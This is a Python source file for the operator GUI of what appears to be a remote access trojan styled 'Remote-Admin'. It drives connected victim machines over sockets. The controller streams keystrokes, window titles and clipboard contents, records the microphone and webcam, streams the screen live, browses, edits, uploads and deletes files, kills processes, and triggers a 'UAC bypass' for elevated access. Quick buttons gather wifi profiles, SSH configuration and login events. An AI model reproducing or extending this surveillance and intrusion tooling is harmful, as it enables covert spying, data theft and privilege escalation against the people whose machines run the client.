"""
gui_commands.py - Command Execution & Quick Command Buttons
"""
import socket
import threading
import time
import json
import tkinter as tk
from tkinter import messagebox
import gui_globals as g


def log_message(message, level="INFO"):
    g.log_message(message, level)


def _call_window_method(win, method_name):
    try:
        if win and win.winfo_exists():
            getattr(win, method_name)()
    except (tk.TclError, AttributeError):
        pass


# _screen_stream_active is defined near the Live Screen Stream section below


def execute_command(cmd, cmd_name):
    """Execute command on active client — runs in background thread."""
    if _screen_stream_active:
        g.root.after(0, lambda: messagebox.showwarning("Stream Active", "Please close the Live Screen Monitor window before using other features!"))
        def _restore_prompt():
            try:
                g.terminal_output.insert(tk.END, "\nRemote-Admin> ", "prompt")
                g.terminal_output.mark_set("input_start", "end-1c")
                g.terminal_output.see(tk.END)
            except Exception:
                pass
        g.root.after(50, _restore_prompt)
        return

    conn = None
    client_hostname = "Unknown"
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n❌ ERROR: No active client\n\n", "error"))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
                g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
                return
            conn = g.clients[g.active_client_id]["conn"]
            client_hostname = g.clients[g.active_client_id].get("info", {}).get("hostname", "Unknown")

        conn.settimeout(1.0)
        log_message(f"Executing: {cmd}", "INFO")
        conn.sendall(cmd.encode())

        if cmd.lower() == "exit":
            g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n✓ Disconnecting...\n\n", "success"))
            import gui_network as net
            g.root.after(0, net.disconnect_active_client)
            return

        all_data = b""
        chunk_count = 0
        max_chunks = 200
        start_time = time.time()
        last_update = time.time()

        is_special_cmd = cmd.upper().startswith((
            "SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:",
            "WEBCAM", "MICROPHONE", "PROCESS_LIST", "SYSTEM_METRICS",
            "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:",
            "READ_TEXT_FILE:", "WRITE_TEXT_FILE:",
            "PRIV_INFO", "UAC_BYPASS",
            "LIVE_SCREEN", "MOUSE_", "KEY_PRESS:",
        ))
        if cmd.upper().startswith("MICROPHONE"):
            try:
                mic_duration = int(cmd.split(":")[1])
            except (IndexError, ValueError):
                mic_duration = 10
            max_timeout = max(30.0, float(mic_duration) + 15.0)
            max_chunks = 2000
        elif cmd.upper().startswith(("READ_TEXT_FILE:", "WRITE_TEXT_FILE:")):
            max_timeout = 25.0
            max_chunks = 1000
        elif cmd.upper().startswith(("DOWNLOAD:", "UPLOAD:", "FILE_BROWSER:")):
            max_timeout = 30.0
            max_chunks = 10000
        else:
            max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
            if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
                max_chunks = 500

        while chunk_count < max_chunks:
            try:
                if time.time() - start_time > max_timeout:
                    log_message(f"Command timed out after {max_timeout}s (chunks: {chunk_count})", "WARNING")
                    break
                chunk = conn.recv(8192)
                if not chunk:
                    break
                all_data += chunk
                chunk_count += 1

                if not is_special_cmd and chunk:
                    try:
                        decoded = chunk.decode(errors="ignore")
                        if "}" in decoded:
                            decoded = decoded.replace("\n}", "").replace("}", "")
                        if decoded:
                            g.root.after(0, lambda t=decoded: g.terminal_output.insert(tk.END, t, "output"))
                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
                    except Exception as e:
                        pass

                if time.time() - last_update > 0.05:
                    g.root.after(0, lambda: g.root.update_idletasks())
                    last_update = time.time()

                if is_special_cmd:
                    # Check if the chunk has a closing brace near the end
                    stripped_chunk = chunk.rstrip(b'\r\n\t ')
                    if stripped_chunk.endswith(b'}'):
                        try:
                            # Try to parse the accumulated buffer to see if it's a complete JSON
                            decoded = all_data.decode(errors="ignore")
                            json_start = decoded.find('{')
                            json_end = decoded.rfind('}')
                            if json_start != -1 and json_end != -1 and json_end >= json_start:
                                json.loads(decoded[json_start:json_end+1])
                                break
                        except Exception:
                            pass
                else:
                    if b'\n}' in chunk:
                        break

            except socket.timeout:
                # Instead of breaking, just continue until max_timeout
                continue
            except Exception as e:
                log_message(f"Receive error: {e}", "ERROR")
                break

        output = all_data.decode(errors="ignore")

        if is_special_cmd:
            _handle_special_response(output)

        log_message(f"Completed: {cmd}", "SUCCESS")

    except socket.error as e:
        err_msg = str(e)
        g.root.after(0, lambda m=err_msg: g.terminal_output.insert(tk.END, f"\n❌ SOCKET ERROR: {m}\n", "error"))
        log_message(f"Socket error on {client_hostname}: {err_msg}", "ERROR")
        import gui_network as net
        g.root.after(100, net.disconnect_active_client)
    except Exception as e:
        err_msg = str(e)
        g.root.after(0, lambda m=err_msg: g.terminal_output.insert(tk.END, f"\n❌ ERROR: {m}\n", "error"))
        log_message(f"Command failed on {client_hostname}: {err_msg}", "ERROR")
    finally:
        # MUST use root.after() — this runs in a background thread, never call tkinter directly!
        def _restore_prompt():
            try:
                g.terminal_output.insert(tk.END, "\nRemote-Admin> ", "prompt")
                g.terminal_output.mark_set("input_start", "end-1c")
                g.terminal_output.mark_gravity("input_start", "left")
                g.terminal_output.see(tk.END)
            except Exception:
                pass
        g.root.after(50, _restore_prompt)


def _handle_special_response(output):
    """Parse and display JSON responses from special commands."""
    import gui_features as feat
    try:
        json_start = output.find('{')
        json_end = output.rfind('}')
        if json_start == -1 or json_end == -1:
            if output.strip():
                g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))
            return
        response = json.loads(output[json_start:json_end+1])
        resp_type = response.get("type", "")

        if resp_type == "SCREENSHOT":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.show_screenshot(response.get("data")))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "✓ Screenshot captured\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "DOWNLOAD":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.save_downloaded_file(response.get("filename"), response.get("data")))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "SYSINFO":
            formatted = json.dumps(response, indent=2)
            g.root.after(0, lambda t=formatted: g.terminal_output.insert(tk.END, t + "\n", "output"))

        elif resp_type == "UPLOAD":
            if response.get("status") == "success":
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
                if g.file_manager_window and g.file_manager_window.winfo_exists():
                    file_manager = g.file_manager_window
                    g.root.after(100, lambda w=file_manager: _call_window_method(w, "refresh"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "WEBCAM":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.show_webcam_photo(response.get("data"), response.get("resolution", "?")))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, f"✓ Webcam captured ({response.get('resolution','?')})\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Webcam failed: {m}\n", "error"))

        elif resp_type == "POPUP":
            if response.get("status") == "success":
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Popup failed: {m}\n", "error"))

        elif resp_type == "MICROPHONE":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.save_audio_file(response.get("data"), response.get("duration", 10), response.get("sample_rate", 44100)))
                g.root.after(0, lambda d=response.get('duration', 10): g.terminal_output.insert(tk.END, f"✓ Audio recorded ({d}s)\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Microphone failed: {m}\n", "error"))

        elif resp_type == "PROCESS_LIST":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.show_task_manager(response.get("data")))
            else:
                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Task Manager Error", f"Failed to get process list:\n{m}"))

        elif resp_type == "SYSTEM_METRICS":
            if response.get("status") == "success":
                if g.dashboard_window and g.dashboard_window.winfo_exists() and hasattr(g.dashboard_window, 'update_metrics'):
                    g.root.after(0, lambda: g.dashboard_window.update_metrics(response.get("data")))

        elif resp_type == "KILL_PROCESS":
            if response.get("status") == "success":
                g.root.after(0, lambda: messagebox.showinfo("Success", f"Process {response.get('pid')} terminated successfully."))
                g.root.after(100, lambda: threading.Thread(target=execute_command, args=("PROCESS_LIST", "Get Process List"), daemon=True).start())
            else:
                g.root.after(0, lambda m=response.get('message'), p=response.get('pid'): messagebox.showerror("Kill Process Error", f"Failed to kill process {p}:\n{m}"))

        elif resp_type == "FILE_BROWSER":
            if response.get("status") == "success":
                if g.file_manager_window and g.file_manager_window.winfo_exists():
                    def _norm(p):
                        """Normalize a remote path for comparison — no filesystem access."""
                        if not p:
                            return ""
                        # Handle virtual drives listing
                        if p in ("DRIVES", "System Drives"):
                            return "system drives"
                        # Lowercase + strip trailing separators for cross-platform compare
                        return p.lower().rstrip("/\\")
                    last_req = getattr(g.file_manager_window, 'last_requested_path', '')
                    resp_path = response.get("path", "")
                    # Show if no last request tracked, or paths match after normalization
                    if not last_req or _norm(resp_path) == _norm(last_req):
                        g.root.after(0, lambda rp=resp_path, rd=response.get("data"): feat.show_file_manager(rp, rd))
            else:
                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("File Manager Error", f"Failed to list directory:\n{m}"))
                if g.file_manager_window and g.file_manager_window.winfo_exists():
                    file_manager = g.file_manager_window
                    g.root.after(0, lambda w=file_manager: _call_window_method(w, "enable_controls"))

        elif resp_type == "DELETE_FILE":
            if response.get("status") == "success":
                g.root.after(0, lambda: messagebox.showinfo("Success", "Deleted successfully."))
                if g.file_manager_window and g.file_manager_window.winfo_exists():
                    file_manager = g.file_manager_window
                    g.root.after(100, lambda w=file_manager: _call_window_method(w, "refresh"))
            else:
                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Delete Error", f"Failed to delete:\n{m}"))

        elif resp_type == "READ_TEXT_FILE":
            if response.get("status") == "success":
                try:
                    import base64
                    raw_bytes = base64.b64decode(response.get("content", ""))
                    content_str = raw_bytes.decode("utf-8")
                    
                    if g.file_manager_window and g.file_manager_window.winfo_exists():
                        file_manager = g.file_manager_window
                        g.root.after(0, lambda w=file_manager: _call_window_method(w, "enable_controls"))
                        
                    g.root.after(0, lambda: feat.open_file_editor(response.get("path"), response.get("encoding"), content_str))
                except Exception as e:
                    g.root.after(0, lambda err=str(e): messagebox.showerror("Editor Error", f"Failed to decode content:\n{err}"))
            else:
                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Editor Error", f"Failed to read file:\n{m}"))
                if g.file_manager_window and g.file_manager_window.winfo_exists():
                    file_manager = g.file_manager_window
                    g.root.after(0, lambda w=file_manager: _call_window_method(w, "enable_controls"))

        elif resp_type == "WRITE_TEXT_FILE":
            if response.get("status") == "success":
                g.root.after(0, lambda: messagebox.showinfo("Success", "Saved successfully."))
                if g.file_editor_window and g.file_editor_window.winfo_exists():
                    file_editor = g.file_editor_window
                    g.root.after(0, lambda w=file_editor: _call_window_method(w, "on_save_success"))
            else:
                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Save Error", f"Failed to save file:\n{m}"))
                if g.file_editor_window and g.file_editor_window.winfo_exists():
                    file_editor = g.file_editor_window
                    g.root.after(0, lambda w=file_editor: _call_window_method(w, "on_save_failed"))

        elif resp_type == "PRIV_INFO":
            g.root.after(0, lambda r=response: feat.show_privilege_window(r))

        elif resp_type == "UAC_BYPASS":
            status = response.get("status")
            msg    = response.get("message", "")
            if status == "success":
                g.root.after(0, lambda m=msg: messagebox.showinfo(
                    "🔥 UAC Bypass Triggered",
                    f"{m}\n\nWatch the client list — an elevated (HIGH) connection will appear shortly."))
            elif status == "already_elevated":
                g.root.after(0, lambda m=msg: messagebox.showinfo("✅ Already Elevated", m))
            else:
                g.root.after(0, lambda m=msg: messagebox.showerror("UAC Bypass Failed", m))

        elif resp_type == "WIFI_SCAN":
            g.root.after(0, lambda r=response: feat.update_geo_wifi_result(r))

    except json.JSONDecodeError:
        if output.strip():
            g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))
    except Exception as e:
        log_message(f"JSON handler error: {e}", "ERROR")


def send_command_from_button(cmd, cmd_name):
    """Send command from any button click."""
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                messagebox.showerror("No Client", "Please select a client first!")
                return
        if g.terminal_output.cget("state") == "disabled":
            return
        try:
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"{cmd}\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            g.terminal_output.see(tk.END)
        except tk.TclError as e:
            log_message(f"Terminal update error: {e}", "ERROR")
            return
        threading.Thread(target=execute_command, args=(cmd, cmd_name), daemon=True, name=f"BtnCmd-{cmd[:15]}").start()
    except Exception as e:
        log_message(f"Error in send_command_from_button: {e}", "ERROR")


def update_commands_for_client_os(client_os):
    """Rebuild quick command buttons with full categorized coverage for all OS."""
    for widget in g.commands_container.winfo_children():
        widget.destroy()
    g.command_buttons.clear()

    is_windows = "windows" in client_os.lower()
    is_linux   = "linux"   in client_os.lower()
    is_mac     = "darwin"  in client_os.lower() or "mac" in client_os.lower()

    def section(title, color):
        """Add a coloured section header."""
        tk.Label(
            g.commands_container, text=f"  {title}",
            font=("Segoe UI", 9, "bold"), bg=color, fg="white",
            anchor="w", padx=6, pady=4
        ).pack(fill="x", pady=(8, 2))

    def btn(label, cmd, icon, color):
        b = tk.Button(
            g.commands_container,
            text=f"{icon}  {label}",
            command=lambda c=cmd, t=label: send_command_from_button(c, t),
            font=("Segoe UI", 10, "bold"),
            bg=color, fg="white",
            relief="flat", padx=14, pady=9,
            cursor="hand2",
            state="normal" if g.active_client_id else "disabled",
            anchor="w",
            activebackground=color, activeforeground="white"
        )
        b.pack(fill="x", pady=2)
        g.command_buttons.append(b)

    # ─────────────────────────── WINDOWS ──────────────────────────────────────
    if is_windows:
        section("🌐  NETWORK & SECURITY", "#1565C0")
        btn("Wifi Profiles",              "netsh wlan show profiles",     "📶", "#0277BD")
        btn("Open Ports",                 "netstat -ano | findstr LISTEN","🔌", "#00695C")
        btn("Firewall Status",            "netsh advfirewall show allprofiles", "🔥", "#BF360C")
        btn("Recent Logins",              "wevtutil qe Security /q:*[System[EventID=4624]] /c:5 /f:text", "🔑", "#F9A825")

        section("💻  SYSTEM & HARDWARE", "#1B5E20")
        btn("Full System Info",           "systeminfo",                   "💻", "#388E3C")
        btn("CPU & RAM Info",             r'''powershell -Command "Get-CimInstance Win32_Processor | Select-Object Name; Get-CimInstance Win32_PhysicalMemory | Select-Object Capacity"''', "⚙️", "#558B2F")
        btn("Installed Programs",         r'''powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table"''', "📦", "#F57F17")

        section("🎯  PROCESS & SERVICES", "#4A148C")
        btn("Top Memory Usage",           r'''powershell -Command "Get-Process | Sort-Object WorkingSet -Descending | Select-Object Name, Id, @{Name='WorkingSet(MB)';Expression={$_.WorkingSet/1MB}} -First 15"''', "📈", "#8E24AA")
        btn("Running Services",           "sc query type= all state= active",           "⚙️", "#00838F")
        btn("Scheduled Tasks",            "schtasks /query /fo LIST",           "📅", "#F57C00")

    # ─────────────────────────── LINUX / MAC ──────────────────────────────────
    elif is_linux or is_mac:
        section("🌐  NETWORK & SECURITY", "#1565C0")
        btn("Open Ports (Listen)",        "netstat -tulnp",               "🔌", "#546E7A")
        btn("SSH Config",                 "cat /etc/ssh/sshd_config | grep -v '#'", "🔑", "#0277BD")
        btn("Firewall Rules",             "iptables -L -n 2>/dev/null || ufw status", "🔥", "#BF360C")
        btn("Login History",              "last | head -20",              "📅", "#F57C00")

        section("💻  SYSTEM & HARDWARE", "#1B5E20")
        btn("System Logs (tail)",         "tail -n 30 /var/log/syslog 2>/dev/null || journalctl -n 30", "📋", "#4527A0")
        btn("Disk Usage (folders)",       "du -sh /*",                    "💾", "#7B1FA2")
        btn("Installed Packages",         "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -30", "📦", "#F57F17")

        section("🎯  PROCESS & SERVICES", "#4A148C")
        btn("Memory Hogs",                "ps aux --sort=-%mem | head -10","🧠", "#8E24AA")
        btn("CPU Hogs",                   "ps aux --sort=-%cpu | head -10","⚙️", "#00838F")
        btn("Running Services",           "systemctl list-units --type=service --state=running 2>/dev/null | head -20", "🔄", "#4CAF50")

    # ─────────────────────────── GENERIC ──────────────────────────────────────
    else:
        section("💻  SYSTEM & NETWORK", "#1B5E20")
        btn("System Info",                "systeminfo",                   "💻", "#388E3C")
        btn("Running Processes",          "tasklist",                     "📊", "#6A1B9A")
        btn("Net Connections",            "netstat -an",                  "🔌", "#546E7A")

    for abtn in g.advanced_buttons:
        abtn.config(state="normal")
    log_message(f"Commands loaded for: {client_os}", "INFO")





def confirm_system_command(cmd, name):
    if messagebox.askyesno("⚠️ Confirm", f"Execute on client:\n\n{name}\n\nThis will affect the client immediately!"):
        send_command_from_button(cmd, name)


def prompt_process_operation(cmd_prefix, operation_name):
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    dialog = tk.Toplevel(g.root)
    dialog.title(operation_name)
    dialog.geometry("500x200")
    dialog.configure(bg="#FFFFFF")
    dialog.resizable(False, False)
    dialog.transient(g.root)
    dialog.grab_set()

    tk.Label(dialog, text=operation_name, font=("Segoe UI", 14, "bold"), bg="#FFFFFF", fg="#1976D2").pack(pady=20)
    input_frame = tk.Frame(dialog, bg="#FFFFFF")
    input_frame.pack(fill="x", padx=40, pady=10)

    label_text = "Process Name:" if "Find" in operation_name else "Process Name (e.g., notepad.exe):"
    tk.Label(input_frame, text=label_text, font=("Segoe UI", 11), bg="#FFFFFF", fg="#424242").pack(anchor="w", pady=(0, 5))
    entry = tk.Entry(input_frame, font=("Segoe UI", 11), width=40, relief="solid", borderwidth=1)
    entry.pack(fill="x", pady=5, ipady=5)
    entry.focus()

    def execute():
        name = entry.get().strip()
        if name:
            if "Kill" in operation_name:
                if not messagebox.askyesno("Confirm", f"Kill process: {name}?"):
                    return
            send_command_from_button(f"{cmd_prefix} {name}", f"{operation_name}: {name}")
            dialog.destroy()

    btn_frame = tk.Frame(dialog, bg="#FFFFFF")
    btn_frame.pack(pady=20)
    tk.Button(btn_frame, text="✓ Execute", command=execute, font=("Segoe UI", 11, "bold"), bg="#4CAF50", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
    tk.Button(btn_frame, text="✗ Cancel", command=dialog.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
    entry.bind("<Return>", lambda e: execute())


# ── Keylog Live-Stream ─────────────────────────────────────────────────────────

_keylog_stream_active = False
_keylog_buffer = []

def start_keylog_stream():
    """
    Send KEYLOG_START to client, silently buffer keystrokes in background.
    Buffered data is offered for save via dialog when stream stops.
    """
    global _keylog_stream_active, _keylog_buffer
    _keylog_stream_active = True
    _keylog_buffer = []

    conn = None
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n❌ No active client\n", "error"))
                _cleanup_keylog()
                return
            conn = g.clients[g.active_client_id]["conn"]

        conn.send(b"KEYLOG_START")
        conn.settimeout(0.3)

        buf = ""
        while _keylog_stream_active:
            try:
                chunk = conn.recv(4096).decode(errors="replace")
                if not chunk:
                    break
                buf += chunk
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    line = line.strip()
                    if line == "[KEYLOG_END]":
                        _keylog_stream_active = False
                        break
                    if line.startswith("[KEYSTROKE]"):
                        ts_key = line[len("[KEYSTROKE]"):].strip()
                        _keylog_buffer.append(ts_key)
                        g.root.after(0, lambda k=ts_key: g.terminal_output.insert(tk.END, f"  ⌨️ {k}\n", "keylog"))
                        g.root.after(0, lambda: g.terminal_output.see(tk.END))
                    elif line.startswith("[WINDOW]"):
                        ts_win = line[len("[WINDOW]"):].strip()
                        parts = ts_win.split(" ", 1)
                        if len(parts) == 2:
                            ts = parts[0]
                            title = parts[1]
                            _keylog_buffer.append(f"\n--- [{ts}] 🪟 {title} ---")
                            g.root.after(0, lambda t=title: g.terminal_output.insert(tk.END, f"\n🪟 [{t}]\n", "output"))
                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
                    elif line.startswith("[CLIPBOARD]"):
                        ts_clip = line[len("[CLIPBOARD]"):].strip()
                        parts = ts_clip.split(" ", 1)
                        if len(parts) == 2:
                            ts = parts[0]
                            content = parts[1]
                            _keylog_buffer.append(f"\n--- [{ts}] 📋 Clipboard: {content} ---")
                            g.root.after(0, lambda c=content: g.terminal_output.insert(tk.END, f"📋 [Clipboard: {c}]\n", "warning"))
                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
            except socket.timeout:
                continue
            except (OSError, ConnectionError):
                break

    except Exception as e:
        g.root.after(0, lambda m=str(e): g.terminal_output.insert(tk.END, f"\n❌ Keylog stream error: {m}\n", "error"))
    finally:
        _cleanup_keylog()


def stop_keylog():
    """Send KEYLOG_STOP to client to end the live stream."""
    global _keylog_stream_active
    _keylog_stream_active = False
    try:
        with g.clients_lock:
            if g.active_client_id and g.active_client_id in g.clients:
                conn = g.clients[g.active_client_id]["conn"]
                try:
                    conn.send(b"KEYLOG_STOP")
                except Exception:
                    pass
    except Exception:
        pass
    _cleanup_keylog()


def _cleanup_keylog():
    """Restore keylog button, prompt save dialog, restore prompt."""
    global _keylog_stream_active, _keylog_buffer
    _keylog_stream_active = False
    if g.keylog_active:
        g.keylog_active = False
        btn = g.keylog_button
        if btn:
            g.root.after(0, lambda: btn.config(text="⌨️ Keylog", bg="#FF6F00"))

        if _keylog_buffer:
            keys_copy = list(_keylog_buffer)
            g.root.after(0, lambda buf=keys_copy: _prompt_save_keylog(buf))

        _keylog_buffer = []
        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "⌨️ Keylog stream ended\n", "success"))
        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
        g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))


def _prompt_save_keylog(keys):
    """Ask user if they want to save the captured keystrokes — runs on main thread."""
    if not keys:
        return
    from tkinter import messagebox, filedialog
    ask = messagebox.askyesno("⌨️ Keylog Complete", f"{len(keys)} keys captured.\n\nSave keystrokes to file?")
    if not ask:
        return
    from datetime import datetime
    fn = filedialog.asksaveasfilename(
        defaultextension=".txt",
        filetypes=[("Text", "*.txt"), ("All", "*.*")],
        initialfile=f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    if fn:
        try:
            with open(fn, "w", encoding="utf-8") as f:
                f.write(f"Keylog Capture\n")
                f.write(f"Keys: {len(keys)}\n")
                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n\n")
                f.write("\n".join(keys))
            g.terminal_output.insert(tk.END, f"✓ Keylog saved: {fn} ({len(keys)} keys)\n", "success")
        except Exception as e:
            g.terminal_output.insert(tk.END, f"❌ Save failed: {e}\n", "error")


# ── Microphone Live-Stream ─────────────────────────────────────────────────────

_mic_stream_active = False

def start_mic_stream():
    """Send MIC_START to client — recording starts immediately."""
    global _mic_stream_active
    _mic_stream_active = True
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                return
            conn = g.clients[g.active_client_id]["conn"]
        conn.send(b"MIC_START")
    except Exception:
        pass


def stop_mic():
    """Send MIC_STOP, then receive audio and prompt save dialog."""
    global _mic_stream_active
    _mic_stream_active = False
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                _cleanup_mic()
                return
            conn = g.clients[g.active_client_id]["conn"]

        conn.send(b"MIC_STOP")

        # Receive audio JSON response
        all_data = b""
        conn.settimeout(30.0)
        while True:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                all_data += chunk
                if b"}" in chunk:
                    break
            except socket.timeout:
                break

        if all_data:
            import gui_features as feat
            output = all_data.decode(errors="replace")
            try:
                import json as _json
                response = _json.loads(output)
                if response.get("status") == "success":
                    dur = response.get("duration", 0)
                    sr = response.get("sample_rate", 44100)
                    g.root.after(0, lambda: feat.save_audio_file(response.get("data", ""), dur, sr))
                    g.root.after(0, lambda d=dur: g.terminal_output.insert(tk.END, f"✓ Audio recorded ({d}s)\n", "success"))
                else:
                    g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Mic failed: {m}\n", "error"))
            except Exception:
                if output.strip():
                    g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))

    except Exception as e:
        g.root.after(0, lambda m=str(e): g.terminal_output.insert(tk.END, f"❌ Mic stream error: {m}\n", "error"))
    finally:
        _cleanup_mic()


def _cleanup_mic():
    """Restore mic button and prompt after stream ends."""
    global _mic_stream_active
    _mic_stream_active = False
    if g.mic_active:
        g.mic_active = False
        btn = g.mic_button
        if btn:
            g.root.after(0, lambda: btn.config(text="🎤 Microphone", bg="#00ACC1"))
        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "🎤 Microphone stream ended\n", "success"))
        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
        g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))


# ── Live Screen Stream ────────────────────────────────────────────────────────

_screen_stream_active = False
_screen_stream_cleanup_done = False

def start_screen_stream(frame_callback):
    """Send LIVE_SCREEN to client, receive screen frames and invoke callback."""
    global _screen_stream_active, _screen_stream_cleanup_done
    _screen_stream_active = True
    _screen_stream_cleanup_done = False

    conn = None
    previous_timeout = None
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                g.root.after(0, lambda: log_message("No active client for screen stream", "ERROR"))
                _cleanup_screen_stream()
                return
            conn = g.clients[g.active_client_id]["conn"]

        log_message("Starting Live Screen Stream...", "INFO")
        conn.sendall(b"LIVE_SCREEN")
        previous_timeout = conn.gettimeout()
        conn.settimeout(0.3)

        buf = b""
        while _screen_stream_active:
            try:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                buf += chunk
                while b"\n[FRAME_END]\n" in buf:
                    frame_bytes, buf = buf.split(b"\n[FRAME_END]\n", 1)
                    if frame_bytes:
                        try:
                            decoded = frame_bytes.decode(errors="replace").strip()
                            json_start = decoded.find('{')
                            json_end = decoded.rfind('}')
                            if json_start != -1 and json_end != -1:
                                response = json.loads(decoded[json_start:json_end+1])
                                if response.get("type") == "LIVE_SCREEN":
                                    if response.get("status") == "success":
                                        frame_data = response.get("data")
                                        res = response.get("resolution", "?")
                                        g.root.after(0, lambda fd=frame_data, r=res: frame_callback(fd, r))
                                    else:
                                        log_message(f"Live Screen Error: {response.get('message')}", "ERROR")
                        except Exception:
                            pass
            except socket.timeout:
                continue
            except (OSError, ConnectionError):
                break
    except Exception as e:
        log_message(f"Screen stream error: {e}", "ERROR")
    finally:
        if conn:
            try:
                # Wait 200ms for client to process LIVE_SCREEN_STOP and stop sending
                time.sleep(0.2)
                # Flush leftover packets in the socket buffer
                conn.settimeout(0.0)
                try:
                    while True:
                        if not conn.recv(65536):
                            break
                except (BlockingIOError, socket.error):
                    pass
                finally:
                    conn.settimeout(previous_timeout)
            except Exception as fe:
                log_message(f"Error flushing socket: {fe}", "WARNING")
        _cleanup_screen_stream()

def stop_screen_stream():
    """Send LIVE_SCREEN_STOP to client to end the live stream."""
    global _screen_stream_active
    _screen_stream_active = False
    try:
        with g.clients_lock:
            if g.active_client_id and g.active_client_id in g.clients:
                conn = g.clients[g.active_client_id]["conn"]
                try:
                    conn.sendall(b"LIVE_SCREEN_STOP")
                except Exception:
                    pass
    except Exception:
        pass
    _cleanup_screen_stream()

def _cleanup_screen_stream():
    global _screen_stream_active, _screen_stream_cleanup_done
    if _screen_stream_cleanup_done:
        return
    _screen_stream_cleanup_done = True
    _screen_stream_active = False
    
    # Restore screen stream button status if any reference exists
    btn = getattr(g, 'screen_monitor_button', None)
    if btn:
        g.root.after(0, lambda: btn.config(text="🖥️ Screen Stream", bg="#3949AB"))

    def _restore_prompt():
        try:
            g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
            g.terminal_output.mark_set("input_start", "end-1c")
            g.terminal_output.see(tk.END)
        except Exception:
            pass
    g.root.after(50, _restore_prompt)
